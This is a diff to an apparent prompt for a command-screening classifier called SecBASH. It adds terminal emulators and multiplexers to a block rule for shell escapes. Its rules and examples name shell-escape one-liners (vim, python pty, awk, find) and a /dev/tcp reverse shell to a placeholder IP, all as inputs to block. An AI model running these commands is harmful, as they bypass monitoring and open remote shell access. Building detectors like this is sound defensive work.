@@ -49,7 +49,10 @@ Respond ONLY with valid JSON, no other text:
 Apply rules in order - first match determines action:
 
 1. Does the command spawn a shell or escape to shell?
-   Examples: `vim -c ':!/bin/sh'`, `python -c 'import pty;pty.spawn("/bin/sh")'`, `awk 'BEGIN {system("/bin/sh")}'`, `find -exec /bin/sh \\;`
+   1a. Indirect shell escapes: Non-shell binaries that spawn a shell.
+       Examples: `vim -c ':!/bin/sh'`, `python -c 'import pty;pty.spawn("/bin/sh")'`, `awk 'BEGIN {system("/bin/sh")}'`, `find -exec /bin/sh \\;`
+   1b. Direct shell spawners: Terminal emulators and multiplexers that provide a shell session.
+       Examples: `gnome-terminal`, `screen`, `tmux`, `xterm`, `konsole`, `xfce4-terminal`, `byobu`
    → BLOCK
 
 2. Does the command execute arbitrary commands?
@@ -139,6 +142,12 @@ Output: {"action": "block", "reason": "Shell escape from vim bypasses SecBASH mo
 
 Input: `awk 'BEGIN {system("/bin/sh")}'`
 Output: {"action": "block", "reason": "Arbitrary command execution via awk system() spawns shell", "confidence": 0.95}
+
+Input: `screen`
+Output: {"action": "block", "reason": "Terminal multiplexer spawns a shell session, bypassing SecBASH monitoring", "confidence": 0.95}
+
+Input: `tmux new-session`
+Output: {"action": "block", "reason": "Terminal multiplexer creates new shell session, bypassing SecBASH monitoring", "confidence": 0.95}
 
 Input: `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`
 Output: {"action": "block", "reason": "Reverse shell establishes unauthorized remote access", "confidence": 0.98}
